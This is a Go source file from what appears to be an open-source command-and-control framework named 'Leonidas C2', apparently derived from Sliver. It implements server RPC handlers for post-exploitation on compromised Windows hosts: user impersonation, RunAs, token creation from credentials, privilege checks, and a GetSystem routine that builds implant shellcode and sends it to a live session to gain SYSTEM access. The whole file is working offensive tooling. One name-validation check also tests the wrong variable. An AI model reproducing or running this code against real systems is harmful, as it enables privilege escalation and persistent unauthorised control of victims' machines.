package rpc

/*
	Leonidas C2 Framework
	Copyright (C) 2026  Leonidas C2 Project

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"os"

	"github.com/leonidas-c2/leonidas/protobuf/clientpb"
	"github.com/leonidas-c2/leonidas/protobuf/commonpb"
	"github.com/leonidas-c2/leonidas/protobuf/leonidaspb"
	"github.com/leonidas-c2/leonidas/server/codenames"
	"github.com/leonidas-c2/leonidas/server/core"
	"github.com/leonidas-c2/leonidas/server/db"
	"github.com/leonidas-c2/leonidas/server/generate"
	"github.com/leonidas-c2/leonidas/util"

	"google.golang.org/grpc/codes"
	"google.golang.org/grpc/status"
	"google.golang.org/protobuf/proto"
)

// Impersonate - Impersonate a remote user
func (rpc *Server) Impersonate(ctx context.Context, req *leonidaspb.ImpersonateReq) (*leonidaspb.Impersonate, error) {
	resp := &leonidaspb.Impersonate{Response: &commonpb.Response{}}
	err := rpc.GenericHandler(req, resp)
	if err != nil {
		return nil, err
	}
	return resp, nil
}

// RunAs - Run a remote process as a specific user
func (rpc *Server) RunAs(ctx context.Context, req *leonidaspb.RunAsReq) (*leonidaspb.RunAs, error) {
	resp := &leonidaspb.RunAs{Response: &commonpb.Response{}}
	err := rpc.GenericHandler(req, resp)
	if err != nil {
		return nil, err
	}
	return resp, nil
}

// RevToSelf - Revert process context to self
func (rpc *Server) RevToSelf(ctx context.Context, req *leonidaspb.RevToSelfReq) (*leonidaspb.RevToSelf, error) {
	resp := &leonidaspb.RevToSelf{Response: &commonpb.Response{}}
	err := rpc.GenericHandler(req, resp)
	if err != nil {
		return nil, err
	}
	return resp, nil
}

// CurrentTokenOwner - Retrieve the thread token's owner
func (rpc *Server) CurrentTokenOwner(ctx context.Context, req *leonidaspb.CurrentTokenOwnerReq) (*leonidaspb.CurrentTokenOwner, error) {
	resp := &leonidaspb.CurrentTokenOwner{Response: &commonpb.Response{}}
	err := rpc.GenericHandler(req, resp)
	if err != nil {
		return nil, err
	}
	return resp, nil
}

// GetSystem - Attempt to get 'NT AUTHORITY/SYSTEM' access on a remote Windows system
func (rpc *Server) GetSystem(ctx context.Context, req *clientpb.GetSystemReq) (*leonidaspb.GetSystem, error) {
	var (
		shellcode []byte
		name      string
	)

	if req == nil || req.Request == nil {
		return nil, ErrMissingRequestField
	}

	session := core.Sessions.Get(req.Request.SessionID)
	if session == nil {
		return nil, ErrInvalidSessionID
	}

	// retrieve http c2 implant config
	httpC2Config, err := db.LoadHTTPC2ConfigByName(req.Config.HTTPC2ConfigName)
	if err != nil {
		return nil, rpcError(err)
	}

	if req.Name == "" {
		name, err = codenames.GetCodename()
		if err != nil {
			return nil, rpcError(err)
		}
	} else if err := util.AllowedName(name); err != nil {
		return nil, status.Error(codes.InvalidArgument, err.Error())
	} else {
		name = req.Name
	}

	shellcode, _, err = getSliverShellcode(name)
	if err != nil {
		req.Config.Format = clientpb.OutputFormat_SHELLCODE
		req.Config.ObfuscateSymbols = false
		req.Config.IsShellcode = true
		req.Config.IsSharedLib = false
		req.Config.TemplateName = "sliver"
		if len(req.Config.Exports) == 0 {
			req.Config.Exports = []string{"StartW"}
		}
		build, err := generate.GenerateConfig(name, req.Config)
		if err != nil {
			return nil, rpcError(err)
		}
		shellcodePath, err := generate.SliverShellcode(name, build, req.Config, httpC2Config.ImplantConfig)
		if err != nil {
			return nil, rpcError(err)
		}
		shellcode, _ = os.ReadFile(shellcodePath)
	}
	data, err := proto.Marshal(&leonidaspb.InvokeGetSystemReq{
		Data:           shellcode,
		HostingProcess: req.HostingProcess,
		Request:        req.GetRequest(),
	})
	if err != nil {
		return nil, rpcError(err)
	}

	timeout := rpc.getTimeout(req)
	data, err = session.Request(leonidaspb.MsgInvokeGetSystemReq, timeout, data)
	if err != nil {
		return nil, rpcError(err)
	}
	getSystem := &leonidaspb.GetSystem{}
	err = proto.Unmarshal(data, getSystem)
	if err != nil {
		return nil, rpcError(err)
	}
	return getSystem, nil
}

// MakeToken - Creates a new logon session to impersonate a user based on its credentials.
func (rpc *Server) MakeToken(ctx context.Context, req *leonidaspb.MakeTokenReq) (*leonidaspb.MakeToken, error) {
	resp := &leonidaspb.MakeToken{Response: &commonpb.Response{}}
	err := rpc.GenericHandler(req, resp)
	if err != nil {
		return nil, err
	}
	return resp, nil
}

// GetPrivs - gRPC interface to get privilege information from the current process
func (rpc *Server) GetPrivs(ctx context.Context, req *leonidaspb.GetPrivsReq) (*leonidaspb.GetPrivs, error) {
	if req == nil || req.Request == nil {
		return nil, ErrMissingRequestField
	}

	sessionID := req.Request.SessionID

	resp := &leonidaspb.GetPrivs{Response: &commonpb.Response{}}
	err := rpc.GenericHandler(req, resp)
	if err != nil {
		return nil, err
	}

	/*
		Update integrity information for a session
		beacons will have to be updated by the client after the information is received from the implant
	*/
	if !req.Request.Async {
		session := core.Sessions.Get(sessionID)
		if session == nil {
			return nil, ErrInvalidSessionID
		}
		session.Integrity = resp.ProcessIntegrity
		core.Sessions.UpdateSession(session)
	}

	return resp, nil
}
